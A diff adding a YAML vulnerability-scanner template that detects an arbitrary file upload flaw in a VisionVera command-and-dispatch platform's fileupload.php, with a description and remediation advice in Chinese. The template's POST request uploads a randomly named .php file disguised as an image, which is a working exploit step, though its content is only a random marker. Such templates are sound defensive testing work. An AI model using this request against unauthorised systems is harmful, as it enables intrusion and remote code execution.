@@ -1,0 +1,32 @@
+id: visionvera-zhihuidiaodu-fileupload-php-upload
+
+info:
+  name: visionvera zhihuidiaodu fileupload.php 任意文件上传漏洞
+  author: bl
+  severity: critical
+  tags: 指挥调度管理平台
+  description: |-
+    该模板用于检测 visionvera zhihuidiaodu fileupload.php 组件中的任意文件上传漏洞。攻击者可利用受影响端点上传恶意文件，在特定服务器配置下可能导致远程代码执行或存储型内容滥用。实际影响取决于目标版本、部署配置及端点暴露情况。
+  remediation: >-
+    升级到已修复版本，仅允许业务必需的文件类型，校验文件实际内容而不能只检查扩展名；将上传文件存放在 Web 根目录之外并使用随机生成的文件名，禁止上传目录执行脚本，同时限制文件大小和访问权限。
+  
+variables:
+  r0: '{{to_lower(rand_base(8))}}'
+  r1: '{{to_lower(rand_base(8))}}'
+
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/api/client/fileupload.php'
+    headers:
+      Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryVBf7Cs8QWsfwC82M
+    body: "------WebKitFormBoundaryVBf7Cs8QWsfwC82M\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{r1}}.php\"\r\nContent-Type: image/jpeg\r\n\r\n{{r0}}\r\n------WebKitFormBoundaryVBf7Cs8QWsfwC82M\r\nContent-Disposition: form-data; name=\"number\";\r\n\r\n5465\r\n------WebKitFormBoundaryVBf7Cs8QWsfwC82M\r\nContent-Disposition: form-data; name=\"type\";\r\n\r\n1\r\n------WebKitFormBoundaryVBf7Cs8QWsfwC82M\r\nContent-Disposition: form-data; name=\"title\";\r\n\r\n1\r\n------WebKitFormBoundaryVBf7Cs8QWsfwC82M--\r\n"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{\"header\":{\"code\":\"1\", \"msg\":\"ok\"}}"
+        part: body
